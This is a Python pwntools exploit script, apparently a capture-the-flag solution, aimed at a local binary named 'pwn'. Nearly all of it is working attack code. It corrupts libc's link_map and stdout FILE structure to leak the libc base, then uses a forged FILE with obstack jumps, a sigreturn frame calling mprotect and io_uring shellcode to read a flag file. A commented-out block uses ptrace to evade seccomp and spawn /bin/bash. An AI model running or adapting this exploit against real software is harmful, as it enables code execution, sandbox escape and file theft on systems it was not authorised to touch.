from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io = process("./pwn")
io = remote("127.0.0.1", 9999)
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def dbg():
    gdb.attach(io)


def write(py, con):
    io.send(p64(py))
    io.send(p8(con))


def write_all(offset, date):
    for i, byte in enumerate(date):
        io.send(p64(offset + i))
        io.send(p8(byte))


libc_py = 0x43FF0
link_map_py = libc_py + 0x26B2E0  # 0x2C32D0  # 0x2ae2d0
io.send(p64(0x40000))
stdout = 0x25F770
io_list_all = 0x25F670

write(link_map_py, elf.got["_Exit"] - elf.got["write"])
write_all(stdout, p32(0xFBAD3887))
write(stdout + 0x28, 0xFF)  # _IO_write_ptr
write_all(libc_py + 0x26B118 + 0x55, b"_IO_flush_all\x00")  # r_debug+0x55

write(0x26B348 + libc_py, 0xB8)  # l_info[DT_SYMTAB]-> DT_DEBUG 0x26b348
write_all(stdout, p32(0xFBAD1800))
write(stdout + 0x20, 0x00)  # _IO_write_base
write(stdout + 0x28, 0xFF)  # _IO_write_ptr
io.recv(0x1E0)
libc.address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x217600
info("libc base: " + hex(libc.address))
write(0x26B348 + libc_py, 0x78)
io.recv()
file_addr = libc.sym["_IO_2_1_stdout_"]
payload_addr = file_addr + 0x10
frame_addr = file_addr + 0xE8
rop_addr = frame_addr + 0xF8
buf_addr = rop_addr + 0x60
fake_file = b""
fake_file += p64(0)  # _IO_read_end
fake_file += p64(0)  # _IO_read_base
fake_file += p64(0)  # _IO_write_base
fake_file += p64(1)  # _IO_write_ptr
fake_file += p64(0)  # _IO_write_end
fake_file += p64(0)  # _IO_buf_base;
fake_file += p64(0)  # _IO_buf_end
fake_file += p64(0) * 4  # from _IO_save_base to _markers
fake_file += p64(
    next(
        libc.search(
            asm("mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20];"),
            executable=True,
        )
    )
)  # FILE chain ptr
fake_file += p32(2)  # _fileno for stderr is 2
fake_file += p32(0)  # _flags2, usually 0
fake_file += p64(frame_addr)  # _old_offset
fake_file += p16(1)  # _cur_column
fake_file += b"\x00"  # _vtable_offset
fake_file += b"\n"  # _shortbuf[1]
fake_file += p32(0)  # padding
fake_file += p64(libc.sym["_IO_2_1_stdout_"] + 0x1EA0)  # _IO_stdfile_1_lock
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset
fake_file += p64(0)  # _codecvt
fake_file += p64(0)  # _IO_wide_data_1
fake_file += p64(0) * 3  # from _freeres_list to __pad5
fake_file += p32(0xFFFFFFFF)  # _mode
fake_file += b"\x00" * 19  # _unused2
fake_file = fake_file.ljust(0xD8 - 0x10, b"\x00")
fake_file += p64(libc.address + 0x2173C0 + 0x20)  # libc.sym['_IO_obstack_jumps']
fake_file += p64(file_addr + 0x30)

frame = SigreturnFrame()
frame.rdi = libc.sym["_IO_2_1_stdout_"] & 0xFFFFFFFFFFFFF000
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = rop_addr
frame.rip = libc.sym["mprotect"]

frame = bytearray(bytes(frame))
frame[8 : 8 + 8] = p64(frame_addr)
frame[0x20 : 0x20 + 8] = p64(libc.sym["setcontext"] + 61)
frame = bytes(frame)
'''
order2 = b"h\x00"[::-1].hex()
order1 = b"/bin/bas"[::-1].hex()
shellcode1 = asm(
    f"""
_start:

    /* Step 1: fork a new process */
    mov rax, 57             /* syscall number for fork (on x86_64) */
    syscall                 /* invoke fork() */

    test rax, rax           /* check if return value is 0 (child) or positive (parent) */
    js _exit                /* if fork failed, exit */

    /* Step 2: If parent process, attach to child process */
    cmp rax, 0              /* are we the child process? */
    je child_process        /* if yes, jump to child_process */

parent_process:
    /* Store child PID */
    mov r8,rax

    mov rsi, r8            /* rdi = child PID */

    /* Attach to child process */
    mov rax, 101            /* syscall number for ptrace */
    mov rdi, 0x10           /* PTRACE_ATTACH */
    xor rdx, rdx            /* no options */
    xor r10, r10            /* no data */
    syscall                 /* invoke ptrace(PTRACE_ATTACH, child_pid, 0, 0) */

monitor_child:
    /* Wait for the child to stop */
    
    mov rdi, r8            /* rdi = child PID */
    mov rsi, rsp            /*  no status*/
    xor rdx, rdx            /* no options */
    xor r10, r10            /* no rusage */
    mov rax, 61             /* syscall number for wait4 */
    syscall                 /* invoke wait4() */

    /* Set ptrace options */
    mov rax, 110
    syscall    
    mov rdi, 0x4200         /* PTRACE_SETOPTIONS */
    mov rsi, r8            /* rsi = child PID */
    xor rdx, rdx            /* no options */
    mov r10, 0x00000080     /* PTRACE_O_TRACESECCOMP */
    mov rax, 101            /* syscall number for ptrace */
    syscall                 /* invoke ptrace(PTRACE_SETOPTIONS, child_pid, 0, 0) */

    /* Allow the child process to continue */
    mov rax, 110
    syscall
    
    mov rdi, 0x7            /* PTRACE_CONT */
    mov rsi, r8            /* rsi = child PID */
    xor rdx, rdx            /* no options */
    xor r10, r10            /* no data */
    mov rax, 101            /* syscall number for ptrace */
    syscall                 /* invoke ptrace(PTRACE_CONT, child_pid, 0, 0) */

    /* Loop to keep monitoring the child */
    jmp monitor_child

child_process:
    /* Child process code here */
    /* For example, we could execute a shell or perform other actions */
    /* To keep it simple, let's just execute `/bin/sh` */
                
    /* sleep(5) */
    /* push 0 */
    push 1
    dec byte ptr [rsp]
    /* push 5 */
    push 5
    /* nanosleep(requested_time='rsp', remaining=0) */
    mov rdi, rsp
    xor esi, esi /* 0 */
    /* call nanosleep() */
    push SYS_nanosleep /* 0x23 */
    pop rax
    syscall

    mov rax, 0x{order2}  /* "/bin/sh" */
    push rax
    mov rax, 0x{order1}  /* "/bin/sh" */
    push rax
    mov rdi, rsp    
    mov rsi, 0
    xor rdx, rdx
    mov rax, 59             /* syscall number for execve */
    syscall
    jmp child_process

_exit:
    /* Exit the process */
    mov rax, 60             /* syscall number for exit */
    xor rdi, rdi            /* status 0 */
    syscall
"""
)
'''
shellcode = asm(
    """
/*视情况调整栈帧*/
    add rsp, 0x2000
/*int uring_fd = syscall(SYS_io_uring_setup, 16, &params);*/
    mov rax, 0
    lea rdi, [rsp+0x100]
    mov rcx, 15
    rep stosq
    mov rdi, 16
    lea rsi, [rsp+0x100]
    mov rax, 0x1a9
    syscall
/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/
    mov qword ptr [rsp+0x200], rax
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x208], rax
/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0x8000000
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x210], rax
/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0x10000000
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x218], rax

/*openat*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 18
    mov byte ptr [rdi+1], 16
    mov dword ptr [rdi+4], -100
    /* 要打开文件的路径存放在 rsp+0x300 处 */
    mov rax, 0x67616c662f2e
    mov qword ptr [rsp+0x300], rax
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+28], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 1
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall

    mov rdi, qword ptr [rsp+0x210]
    mov edx, dword ptr [rsp+0x164]
    add rdi, rdx
    mov edx, dword ptr [rdi+8]
    mov qword ptr [rsp+0x220], rdx

 /*read*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 22
    mov rax, qword ptr [rsp+0x220]
    mov dword ptr [rdi+4], eax
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+24], 0x100

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 1
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall

/*write*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 23
    mov dword ptr [rdi+4], 1
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+24], 0x100

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 3
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall
"""
)

payload = fake_file + frame + p64(rop_addr + 8) + shellcode
sleep(1)
write_all(stdout + 0x10, payload)
# gdb.attach(io, "b _obstack_newchunk\nc")
write(0x26B348 + libc_py, 0xB8)
io.interactive()
